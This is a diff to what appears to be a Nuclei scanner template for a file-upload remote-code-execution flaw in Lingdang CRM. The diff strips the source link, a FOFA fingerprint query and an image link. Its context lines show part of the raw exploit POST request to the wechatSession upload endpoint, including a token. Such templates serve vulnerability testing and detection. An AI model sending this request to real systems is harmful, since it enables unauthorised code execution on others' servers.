@@ -3,12 +3,8 @@ info:
   name: 灵当CRM index.php文件上传致RCE漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/pkihl8yw4rngzy07'
+  description: ''
   tags: rce,file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: pkihl8yw4rngzy07
-    fofa: body="include/js/ldAjax.js"
 http:
 - raw:
   - 'POST /crm/wechatSession/index.php?token=9b06a9617174f1085ddcfb4ccdb6837f&msgid=1&operation=upload HTTP/1.1
@@ -35,7 +31,6 @@ http:
 
     ------WebKitFormBoundary03rNBzFMIytvpWhy--
 
-    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1728984842760-c768ec5a-c2c5-440e-a281-5fd3e46f6d3f.png)
 
     上传定位：
 
